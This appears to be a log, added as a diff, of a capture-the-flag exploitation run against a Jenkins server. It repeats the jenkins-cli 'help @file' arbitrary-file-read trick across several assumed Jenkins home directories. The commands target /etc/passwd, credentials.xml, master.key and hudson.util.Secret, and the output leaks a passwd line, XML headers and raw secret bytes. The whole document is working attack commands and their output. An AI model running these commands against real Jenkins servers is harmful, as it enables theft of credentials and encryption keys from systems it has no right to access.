@@ -1,0 +1,525 @@
+Jenkins File Read Attempts for http://glitch-two.3f30795e908a7c17.ctf.land:7756/
+================================================================================
+
+Attempting to read: System Passwd File (/etc/passwd)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/etc/passwd
+STDOUT:
+
+
+STDERR:
+
+ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+--- Scanning under assumed JENKINS_HOME: /var/lib/jenkins ---
+
+Attempting to read: Main Jenkins Config (in /var/lib/jenkins) (/var/lib/jenkins/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Global Credentials (in /var/lib/jenkins) (/var/lib/jenkins/credentials.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/credentials.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/credentials.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Master Encryption Key (in /var/lib/jenkins) (/var/lib/jenkins/secrets/master.key)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/secrets/master.key
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/secrets/master.key
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Legacy Encryption Key (in /var/lib/jenkins) (/var/lib/jenkins/secrets/hudson.util.Secret)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/secrets/hudson.util.Secret
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/secrets/hudson.util.Secret
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: User List (if exists) (in /var/lib/jenkins) (/var/lib/jenkins/users/users.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/users/users.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/users/users.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Admin User Config (in /var/lib/jenkins) (/var/lib/jenkins/users/admin/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/users/admin/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/users/admin/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Jenkins User Config (in /var/lib/jenkins) (/var/lib/jenkins/users/jenkins/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/lib/jenkins/users/jenkins/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/lib/jenkins/users/jenkins/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+--- Scanning under assumed JENKINS_HOME: /var/jenkins_home ---
+
+Attempting to read: Main Jenkins Config (in /var/jenkins_home) (/var/jenkins_home/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: Too many arguments: <hudson>
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: <?xml version='1.1' encoding='UTF-8'?>)
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Global Credentials (in /var/jenkins_home) (/var/jenkins_home/credentials.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/credentials.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: Too many arguments: <com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1380.va_435002fa_924">
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: <?xml version='1.1' encoding='UTF-8'?>)
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Master Encryption Key (in /var/jenkins_home) (/var/jenkins_home/secrets/master.key)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/secrets/master.key
+STDOUT:
+
+
+STDERR:
+
+ERROR: You must authenticate to access this Jenkins.
+Jenkins CLI
+Usage: java -jar jenkins-cli.jar [-s URL] command [opts...] args...
+Options:
+ -s URL              : the server URL (defaults to the JENKINS_URL env var)
+ -webSocket          : connect using WebSocket (the default; works well with most reverse proxies; requires Jetty)
+ -http               : use a pair of HTTP(S) connections rather than WebSocket
+ -ssh                : use SSH protocol rather than WebSocket (requires -user; SSH port must be open on server)
+ -i KEY              : SSH private key file used for authentication (for use with -ssh)
+ -noCertificateCheck : bypass HTTPS certificate check entirely. Use with caution
+ -noKeyAuth          : do not try to load the SSH authentication private key. Conflicts with -i
+ -user               : specify user (for use with -ssh; must have registered a public key)
+ -strictHostKey      : request strict host key checking (for use with -ssh)
+ -logger FINE        : enable detailed logging from the client
+ -auth [ USER:SECRET | @FILE ] : specify username and either password or API token (or load from them both from a file);
+                                 for use with -http.
+                                 Passing credentials by file is recommended.
+                                 See https://www.jenkins.io/redirect/cli-http-connection-mode for more info and options.
+ -bearer [ TOKEN | @FILE ]     : specify authentication using a bearer token (or load the token from file);
+                                 for use with -http. Mutually exclusive with -auth.
+                                 Passing credentials by file is recommended.
+
+The available commands depend on the server. Run the 'help' command to see the list.
+
+
+Exit Code: 6
+------------------------------------------------------------
+
+Attempting to read: Legacy Encryption Key (in /var/jenkins_home) (/var/jenkins_home/secrets/hudson.util.Secret)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/secrets/hudson.util.Secret
+STDOUT:
+
+
+STDERR:
+
+ERROR: Too many arguments: ����\옓>-;��ҿo''C�`��.�(e�#�Ѩ�EB�
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: ��ޚo3S�J����+V�y'X�#)
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: User List (if exists) (in /var/jenkins_home) (/var/jenkins_home/users/users.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/users/users.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: Too many arguments: <hudson.model.UserIdMapper>
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: <?xml version='1.1' encoding='UTF-8'?>)
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Admin User Config (in /var/jenkins_home) (/var/jenkins_home/users/admin/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/users/admin/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/jenkins_home/users/admin/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Jenkins User Config (in /var/jenkins_home) (/var/jenkins_home/users/jenkins/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/var/jenkins_home/users/jenkins/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /var/jenkins_home/users/jenkins/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+--- Scanning under assumed JENKINS_HOME: /opt/jenkins/data ---
+
+Attempting to read: Main Jenkins Config (in /opt/jenkins/data) (/opt/jenkins/data/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Global Credentials (in /opt/jenkins/data) (/opt/jenkins/data/credentials.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/credentials.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/credentials.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Master Encryption Key (in /opt/jenkins/data) (/opt/jenkins/data/secrets/master.key)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/secrets/master.key
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/secrets/master.key
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Legacy Encryption Key (in /opt/jenkins/data) (/opt/jenkins/data/secrets/hudson.util.Secret)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/secrets/hudson.util.Secret
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/secrets/hudson.util.Secret
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: User List (if exists) (in /opt/jenkins/data) (/opt/jenkins/data/users/users.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/users/users.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/users/users.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Admin User Config (in /opt/jenkins/data) (/opt/jenkins/data/users/admin/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/users/admin/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/users/admin/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Jenkins User Config (in /opt/jenkins/data) (/opt/jenkins/data/users/jenkins/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/opt/jenkins/data/users/jenkins/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /opt/jenkins/data/users/jenkins/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+--- Scanning under assumed JENKINS_HOME: /usr/share/jenkins/jenkins-home ---
+
+Attempting to read: Main Jenkins Config (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Global Credentials (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/credentials.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/credentials.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/credentials.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Master Encryption Key (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/secrets/master.key)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/secrets/master.key
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/secrets/master.key
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Legacy Encryption Key (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/secrets/hudson.util.Secret)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/secrets/hudson.util.Secret
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/secrets/hudson.util.Secret
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: User List (if exists) (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/users/users.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/users/users.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/users/users.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Admin User Config (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/users/admin/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/users/admin/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/users/admin/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+Attempting to read: Jenkins User Config (in /usr/share/jenkins/jenkins-home) (/usr/share/jenkins/jenkins-home/users/jenkins/config.xml)
+------------------------------------------------------------
+Executing command: java -jar ./jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756/ help @/usr/share/jenkins/jenkins-home/users/jenkins/config.xml
+STDOUT:
+
+
+STDERR:
+
+ERROR: No such file: /usr/share/jenkins/jenkins-home/users/jenkins/config.xml
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command
+
+
+Exit Code: 2
+------------------------------------------------------------
+
+All attempts finished.
+================================================================================
